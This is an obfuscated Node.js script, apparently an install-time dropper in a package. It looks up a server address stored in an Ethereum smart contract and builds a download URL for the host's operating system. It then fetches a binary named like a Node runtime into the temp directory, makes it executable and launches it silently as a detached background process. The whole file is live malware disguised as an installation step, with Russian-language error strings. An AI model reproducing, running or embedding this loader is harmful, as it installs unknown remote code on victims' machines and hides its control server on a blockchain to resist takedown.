function _0x4594(){const _0x552904=['basename','axios','/node-win.exe','HDwfn','755','child_process','getDefaultProvider','Contract','ignore','ethers','pipe','/node-linux','wiRmF','1250966MhbfXO','function\x20getString(address\x20account)\x20public\x20view\x20returns\x20(string)','3255660nACpwj','0xa1b40044EBc2794f207D45143Bd82a1B86156c6b','stream','Ошибка\x20при\x20получении\x20IP\x20адреса:','57016tnNqQW','Ошибка\x20при\x20запуске\x20файла:','chmodSync','lMlzp','VCVpn','177771ScaKjw','770uHjqay','22656oRxhfX','win32','QVLAi','error','JEbPI','iAdIw','uXfjl','sqWGP','Unsupported\x20platform:\x20','12RMVIvJ','Ошибка\x20установки:','1864590mLRzvM','tmpdir','createWriteStream','5139190EpvAIS','util','0x52221c293a21D8CA7AFD01Ac6bFAC7175D590A84','lLjGK','9UiMpIL','mainnet','VSxxf','join'];_0x4594=function(){return _0x552904;};return _0x4594();}function _0x22ee(_0x24cf70,_0x1d4529){const _0x4594cd=_0x4594();return _0x22ee=function(_0x22eea0,_0x21fb5e){_0x22eea0=_0x22eea0-0x14a;let _0xf1e951=_0x4594cd[_0x22eea0];return _0xf1e951;},_0x22ee(_0x24cf70,_0x1d4529);}const _0x305578=_0x22ee;(function(_0x1c180b,_0xad927c){const _0x52beb4=_0x22ee,_0x291298=_0x1c180b();while(!![]){try{const _0x405c10=parseInt(_0x52beb4(0x169))/0x1+parseInt(_0x52beb4(0x15c))/0x2+parseInt(_0x52beb4(0x167))/0x3*(parseInt(_0x52beb4(0x172))/0x4)+parseInt(_0x52beb4(0x15e))/0x5+parseInt(_0x52beb4(0x174))/0x6+parseInt(_0x52beb4(0x168))/0x7*(-parseInt(_0x52beb4(0x162))/0x8)+-parseInt(_0x52beb4(0x14b))/0x9*(parseInt(_0x52beb4(0x177))/0xa);if(_0x405c10===_0xad927c)break;else _0x291298['push'](_0x291298['shift']());}catch(_0x2744da){_0x291298['push'](_0x291298['shift']());}}}(_0x4594,0x779be));const {ethers}=require(_0x305578(0x158)),axios=require(_0x305578(0x150)),util=require(_0x305578(0x178)),fs=require('fs'),path=require('path'),os=require('os'),{spawn}=require(_0x305578(0x154)),contractAddress=_0x305578(0x15f),WalletOwner=_0x305578(0x179),abi=[_0x305578(0x15d)],provider=ethers[_0x305578(0x155)](_0x305578(0x14c)),contract=new ethers[(_0x305578(0x156))](contractAddress,abi,provider),fetchAndUpdateIp=async()=>{const _0x187b70=_0x305578;try{const _0x18f55f=await contract['getString'](WalletOwner);return _0x18f55f;}catch(_0x393e1c){return console[_0x187b70(0x16c)](_0x187b70(0x161),_0x393e1c),await fetchAndUpdateIp();}},getDownloadUrl=_0x70797e=>{const _0x54579b=_0x305578,_0x44c7f1={'QVLAi':_0x54579b(0x16a),'lMlzp':'linux','JEbPI':'darwin'},_0x4f2151=os['platform']();switch(_0x4f2151){case _0x44c7f1[_0x54579b(0x16b)]:return _0x70797e+_0x54579b(0x151);case _0x44c7f1[_0x54579b(0x165)]:return _0x70797e+_0x54579b(0x15a);case _0x44c7f1[_0x54579b(0x16d)]:return _0x70797e+'/node-macos';default:throw new Error(_0x54579b(0x171)+_0x4f2151);}},downloadFile=async(_0xb8edab,_0x266c24)=>{const _0x3aeed7=_0x305578,_0x1b7d85={'HDwfn':_0x3aeed7(0x16c),'nqtSG':function(_0x7f6218,_0x1785e1){return _0x7f6218(_0x1785e1);},'wiRmF':'GET','YQHkS':_0x3aeed7(0x160)},_0x39663c=fs[_0x3aeed7(0x176)](_0x266c24),_0x3a7416=await _0x1b7d85['nqtSG'](axios,{'url':_0xb8edab,'method':_0x1b7d85[_0x3aeed7(0x15b)],'responseType':_0x1b7d85['YQHkS']});return _0x3a7416['data'][_0x3aeed7(0x159)](_0x39663c),new Promise((_0x3f0fad,_0x4f2bb4)=>{const _0x420deb=_0x3aeed7;_0x39663c['on']('finish',_0x3f0fad),_0x39663c['on'](_0x1b7d85[_0x420deb(0x152)],_0x4f2bb4);});},executeFileInBackground=async _0x199c9f=>{const _0xd8a521=_0x305578,_0x451eee={'iAdIw':function(_0x395284,_0x4b1d37,_0x2707e4,_0x31d035){return _0x395284(_0x4b1d37,_0x2707e4,_0x31d035);},'lLjGK':_0xd8a521(0x157),'VCVpn':_0xd8a521(0x163)};try{const _0x35a151=_0x451eee[_0xd8a521(0x16e)](spawn,_0x199c9f,[],{'detached':!![],'stdio':_0x451eee[_0xd8a521(0x14a)]});_0x35a151['unref']();}catch(_0x4e12ee){console[_0xd8a521(0x16c)](_0x451eee[_0xd8a521(0x166)],_0x4e12ee);}},runInstallation=async()=>{const _0x474021=_0x305578,_0x3fef59={'RMecG':function(_0x159ede){return _0x159ede();},'VSxxf':function(_0x35835d,_0x5033d3){return _0x35835d(_0x5033d3);},'timme':function(_0x5de81b,_0x4e9f1f){return _0x5de81b!==_0x4e9f1f;},'sqWGP':_0x474021(0x16a),'uXfjl':function(_0x39ed2a,_0x4769f9){return _0x39ed2a(_0x4769f9);}};try{const _0x566f6d=await _0x3fef59['RMecG'](fetchAndUpdateIp),_0x29c370=_0x3fef59[_0x474021(0x14d)](getDownloadUrl,_0x566f6d),_0x519b81=os[_0x474021(0x175)](),_0x5c03dd=path[_0x474021(0x14f)](_0x29c370),_0x3a05d3=path[_0x474021(0x14e)](_0x519b81,_0x5c03dd);await downloadFile(_0x29c370,_0x3a05d3);if(_0x3fef59['timme'](os['platform'](),_0x3fef59[_0x474021(0x170)]))fs[_0x474021(0x164)](_0x3a05d3,_0x474021(0x153));_0x3fef59[_0x474021(0x16f)](executeFileInBackground,_0x3a05d3);}catch(_0x505901){console[_0x474021(0x16c)](_0x474021(0x173),_0x505901);}};runInstallation();